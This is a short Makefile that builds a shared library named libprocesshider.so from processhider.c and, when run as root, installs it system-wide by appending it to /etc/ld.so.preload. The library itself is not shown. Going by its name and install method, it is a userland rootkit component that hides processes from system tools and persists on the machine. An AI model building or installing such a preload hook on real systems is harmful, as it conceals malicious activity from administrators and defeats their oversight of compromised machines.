# all: libprocesshider.so install

install: build
ifneq ($(shell id -u), 0)
	@echo "You must be root to perform this action."
else
	mv libprocesshider.so /usr/local/lib/libprocesshider.so
	sh -c "echo '/usr/local/lib/libprocesshider.so' >> /etc/ld.so.preload"
endif

build: processhider.c
	@gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

.PHONY clean:
	rm -f libprocesshider.so
